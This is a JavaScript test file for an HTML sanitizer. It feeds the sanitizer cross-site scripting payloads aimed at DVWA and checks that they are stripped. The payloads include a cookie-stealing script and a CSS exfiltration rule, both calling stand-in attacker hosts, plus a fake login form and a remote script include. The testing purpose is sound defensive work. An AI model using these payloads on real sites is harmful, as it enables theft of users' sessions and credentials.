import { sanitizeHTML } from './sanitizeHTML';

/** not allowed */
const script = '<script src=""></script>';
const script2 = `<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>`;
const xhrScript = `<script>
var xhr = new XMLHttpRequest();
xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
</script>`;
const aClick = '<a onClick="() => console.log("hello world")"></a>';
const aClickLang =
  '<a lang="en-us" onClick="() => console.log("hello world")"></a>';
const css = `<style>#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}</style><input id="username" value="mikeg" />`;
const login = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>`;
const aScript = `a href="javascript:alert(8007)">Click me</a>`;
const queryString = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">`;

/** allowed */
const a = '<a href="helloworld.com">Hello world</a>';
const aLang = '<a lang="en-us"></a>';

it('should get rid of all script tags', () => {
  expect(sanitizeHTML(script)).toBe('');
  expect(sanitizeHTML(script2)).toBe('');
  expect(sanitizeHTML(xhrScript)).toBe('');
});

it('should remove unwanted blacklisted tags', () => {
  expect(sanitizeHTML(login)).toBe(
    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> Username:<br /><br />Password:<br /><br /><br /><br />'
  );
  expect(sanitizeHTML(aScript)).toBe(
    `a href=\"javascript:alert(8007)\"&gt;Click me`
  );
});

it('should not allow CSS attacks', () => {
  expect(sanitizeHTML(css)).toBe('');
});

it('should not allow query string attacks', () => {
  expect(sanitizeHTML(queryString)).toBe(
    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name='
  );
});

it('should only allow whitelisted HTML attributes', () => {
  expect(sanitizeHTML(aClick)).toBe('<a></a>');
  expect(sanitizeHTML(aLang)).toBe(aLang);
  expect(sanitizeHTML(aClickLang)).toBe(aLang);
  expect(sanitizeHTML(a)).toBe(a);
});
